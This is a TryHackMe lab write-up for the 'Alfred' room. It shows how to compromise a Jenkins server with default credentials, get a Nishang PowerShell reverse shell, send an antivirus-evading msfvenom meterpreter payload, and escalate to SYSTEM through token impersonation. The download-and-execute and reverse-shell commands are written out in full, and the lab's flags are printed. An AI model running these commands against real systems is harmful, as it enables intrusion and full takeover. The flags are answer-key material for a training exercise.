---
title: 'Alfred — THM WriteUp'
date: 'Jun 17, 2024'
description: 'Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.'
category: 'Walkthrough'
cover: 'https://i.postimg.cc/FHHFkDDJ/0-T4l0a8w-QKbjyud-Sc.webp'
tags: ['Tryhackme Walkthrough', 'Alfred']
---

## Initial Access

In this room, we’ll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins — This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it). After which, we’ll use an interesting privilege escalation method to get full system access.

Since this is a Windows application, we’ll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we’ll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

![](https://i.postimg.cc/FHHFkDDJ/0-T4l0a8w-QKbjyud-Sc.webp)

### Q1. How many ports are open? (TCP only)

We will do a normal nmap scan adding the -Pn flag because this machine does not receive ICMP. The report, we get a result of 3 open ports:

```
└─$ sudo nmap -Pn -sCV -vvv -T4 10.10.23.77 -oN nmap.txt  
...  
80/tcp   open  http       syn-ack ttl 127 Microsoft IIS httpd 7.5  
3389/tcp open  tcpwrapped syn-ack ttl 127  
8080/tcp open  http       syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
```

**Answer**: 3

### Q2. What is the username and password for the login panel? (in the format username:password)

On port 80, we find this web page:

![](https://i.postimg.cc/sfb0hXmP/1-Vvo-d-H14b4v-J7pf7-J5-p-Jg.webp)

On port 80, we find this web page:

![](https://i.postimg.cc/3RY3714R/1-m-ZEEj-K4bc-Amm-Rqwrv-NJxag.webp)

Como en el input de thm aparece  *****:*****, es decir, 5* en cada lado, doy por echo que las credenciales son admin:admin. Y en efecto, son correctas:

**Answer**: admin:admin

### Q3. Create a Shell

Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it:

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python:

```
python3 -m http.server
```

From this page, we [download the Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

![](https://i.postimg.cc/y6c3B1fp/1-8-ZPI31w-TSo-FR22-Trrtcl9-A.webp)

Then, we will click on the last project > configuration and we will move to execute, where we will change the whoami by command mentioned before:

![](https://i.postimg.cc/25TRnZ89/1-t-AUq6s-RXq-m-Af-Ke-Jcc22-A.webp)

In addition, we must have the listening port and the http server open in the directory where the Invoke is located. In this way, we will obtain the Reverse Shell:

![](https://i.postimg.cc/gcgV1kn9/1-r-Qpqv38-Yt-ZZ7-OR8-L8-ETPc-A.webp)

**Answer**: No answer needed

### Q4. What is the user.txt flag?

We will go to the desktop directory of the user “bruce” and execute this command:

```
PS C:\Users\bruce\desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
```

![](https://i.postimg.cc/wjqcrykd/1-x-G6-IUP7ouj-z3ix-Y-xlq-Iw.webp)

**User Flag**: 79007a09481963edf2e1321abd9ae2a0

## Switching Shells

To make the privilege escalation easier, let’s switch to a meterpreter shell using the following process.

Use msfvenom to create a Windows meterpreter reverse shell using the following payload:

```
msfvenom -p windows/meterpreter/reverse\_tcp -a x86 --encoder x86/shikata\_ga\_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
```

![](https://i.postimg.cc/dVTFC1zG/1-4a-ESf-ZFP41w59-Varq59b-Fw.webp)

This payload generates an encoded x86–64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won’t flag it as malicious.

After creating this payload, download it to the machine using the same method in the previous step:

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
```

![](https://i.postimg.cc/76QD72YM/1-0-I8f-QS-JPX5-PNg-H1-F2d-Ps-Q.webp)

Before running this program, ensure the handler is set up in Metasploit:

```
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse\_tcp set LHOST your-thm-ip set LPORT listening-port run
```

![](https://i.postimg.cc/9fZJy5mx/1-8s-WMd-XSj-Joe-Da-SJCft-Ttt-Q.webp)

This step uses the Metasploit handler to receive the incoming connection from your reverse shell. Once this is running, enter this command to start the reverse shell

```
Start-Process "shell-name.exe"
```

This should spawn a meterpreter shell for you!

![](https://i.postimg.cc/yYnxjvYs/1-zwfx-Ym-UAp-f7w-pgc-vcrg.webp)

### Q5. What is the final size of the exe payload that you generated?

```
$ msfvenom -p windows/meterpreter/reverse\_tcp ...  
...  
Final size of exe file: 73802 bytes  
Saved as: shell-name.exe
```

**Answer**: 73802

## Privilege Escalation

Now that we have initial access, let’s use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

*   User SIDs(security identifier)
*   Group SIDs
*   Privileges

Amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

*   Primary access tokens: those associated with a user account that are generated on log on
*   Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

*   SecurityAnonymous: current user/client cannot impersonate another user/client
*   SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client
*   SecurityImpersonation: current user/client can impersonate the client’s security context on the local system
*   SecurityDelegation: current user/client can impersonate the client’s security context on a remote system

Where the security context is a data structure that contains users’ relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

*   SeImpersonatePrivilege
*   SeAssignPrimaryPrivilege
*   SeTcbPrivilege
*   SeBackupPrivilege
*   SeRestorePrivilege
*   SeCreateTokenPrivilege
*   SeLoadDriverPrivilege
*   SeTakeOwnershipPrivilege
*   SeDebugPrivilege

There’s more reading [here](https://www.exploit-db.com/papers/42556).

![](https://i.postimg.cc/bvKYF5tS/0-q-AOx1-Ci-Wyxgygnv-H.webp)

### Q6. View all the privileges using whoami /priv

**Answer**: No answer needed

### Q7. Load incognito

You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let’s use the incognito module that will allow us to exploit this vulnerability.

Enter: _load incognito_ to load the incognito module in Metasploit. Please note that you may need to use the _use incognito_ command if the previous command doesn’t work. Also, ensure that your Metasploit is up to date.

![](https://i.postimg.cc/y6TM55qg/1-r-Uy-S5ap-ae-Uy-Cm-Dh-S4b5ew.webp)

### Q8. List Tokens

To check which tokens are available, enter the _list_tokens -g_. We can see that the _BUILTIN\Administrators_ token is available.

Use the _impersonate\_token “BUILTIN\\Administrators”_ command to impersonate the Administrators’ token. What is the output when you run the _getuid_ command?

![](https://i.postimg.cc/vBGsxdFy/1-f-Fuq76vxin76n-T-3ss-EN-w.webp)

![](https://i.postimg.cc/L4CJSxL5/1-Rp-Sn-P9k-U3-Ksm-CBsdd-VPx-GQ.webp)

**Answer**: NT AUTHORITY\SYSTEM

### Q9. Migrate Process

Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions — it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).

Ensure that you migrate to a process with correct permissions (the above question’s answer). The safest process to pick is the services.exe process. First, use the _ps_ command to view processes and find the PID of the services.exe process. Migrate to this process using the command _migrate PID-OF-PROCESS_

![](https://i.postimg.cc/Yq3VSytc/1-orl0-mv-QMrrdesr-Izn-DJxg.webp)

![](https://i.postimg.cc/4dY7Y0DW/1-t8v-Uqd9-Sfv0-Y77-C88-EAhqg.webp)

**Answer**: No answer needed

### Q10. Read the root.txt file located at C:\Windows\System32\config

![](https://i.postimg.cc/2jwyzrLC/1-j0gw-GTk-Q-w4-QHR6-Fwbii-Q.webp)

**Root Flag**: dff0f748678f280250f25a45b8046b4a

---

![](https://i.postimg.cc/d3LVHTsn/1-avocbt-S-Irq-Wn-Xfzu-4-Pew.webp)

Carlos <3